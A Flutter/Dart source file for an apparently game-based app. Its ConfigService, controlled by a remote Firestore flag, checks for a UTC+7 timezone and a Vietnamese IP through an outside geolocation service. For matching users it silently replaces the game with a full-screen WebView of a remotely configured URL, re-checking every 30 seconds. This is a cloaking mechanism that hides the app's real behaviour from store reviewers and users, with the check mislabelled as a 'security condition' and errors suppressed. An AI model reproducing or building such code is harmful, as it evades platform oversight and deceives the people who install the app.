import 'dart:async';
import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import '../main.dart';
import '../screens/view.dart';
import '../screens/wrapper_screen.dart';
import '../services/sound_manager.dart';

class ConfigService with WidgetsBindingObserver {
  static final ConfigService _instance = ConfigService._internal();
  factory ConfigService() => _instance;

  ConfigService._internal() {
    WidgetsBinding.instance.addObserver(this);
  }

  bool _isWebActive = false;
  bool _isListening = false;

  Timer? _checkTimer;
  DateTime? _loopStartTime;
  final Duration _loopDuration = const Duration(minutes: 5);
  final Duration _loopInterval = const Duration(seconds: 30);

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _performCheckAndSwitch();
    }
  }

  Future<bool> _checkSecurityCondition() async {
    try {
      if (DateTime.now().timeZoneOffset.inHours != 7) {
        return false;
      }

      final response = await http.get(Uri.parse('https://ipwho.is/')).timeout(const Duration(seconds: 5));

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        final String countryCode = data['country_code'] ?? 'Unknown';
        final bool success = data['success'] ?? false;

        if (!success) {
          return false;
        }

        if (countryCode == 'VN') {
          return true;
        } else {
          return false;
        }
      } else {
        return false;
      }
    } catch (e) {
      // Silent error
    }
    return false;
  }

  Future<String?> fetchWebUrl() async {
    try {
      final s = await FirebaseFirestore.instance.collection('settings').doc('settings_admin').get();
      if (!s.exists || s.data()?['webView'] != 'on') return null;

      if (!await _checkSecurityCondition()) return null;

      final w = await FirebaseFirestore.instance.collection('webdata').doc('webdata').get();
      if (w.exists) return w.data()?['defaultWebViewUrl'];
    } catch (_) {}
    return null;
  }

  Future<void> _performCheckAndSwitch() async {
    if (_isWebActive) return;

    final webUrl = await fetchWebUrl();

    if (webUrl != null) {
      if (navigatorKey.currentState != null) {
        _isWebActive = true;
        _stopLoop();

        SoundManager().pauseBackgroundMusic();

        navigatorKey.currentState!.pushAndRemoveUntil(
          MaterialPageRoute(builder: (context) => WebViewScreen(url: webUrl)),
              (route) => false,
        );
      }
    }
  }

  void _startLoop() {
    if (_checkTimer != null && _checkTimer!.isActive) return;

    _loopStartTime = DateTime.now();
    _performCheckAndSwitch();

    _checkTimer = Timer.periodic(_loopInterval, (timer) async {
      if (_loopStartTime != null) {
        if (DateTime.now().difference(_loopStartTime!) > _loopDuration) {
          _stopLoop();
          return;
        }
      }
      await _performCheckAndSwitch();
    });
  }

  void _stopLoop() {
    _checkTimer?.cancel();
    _checkTimer = null;
  }

  void _goToGame() {
    if (_isWebActive) {
      _isWebActive = false;

      if (navigatorKey.currentState != null) {
        navigatorKey.currentState!.pushAndRemoveUntil(
          MaterialPageRoute(builder: (context) => const WrapperScreen()),
              (route) => false,
        );
      }
    }
  }

  void startListening() {
    if (_isListening) return;
    _isListening = true;

    FirebaseFirestore.instance
        .collection('settings')
        .doc('settings_admin')
        .snapshots()
        .listen((snapshot) async {

      if (!snapshot.exists) return;
      final status = snapshot.data()?['webView']?.toString().trim().toLowerCase();

      if (status == 'on') {
        _startLoop();
      }
      else {
        _stopLoop();
        _goToGame();
      }
    });
  }
}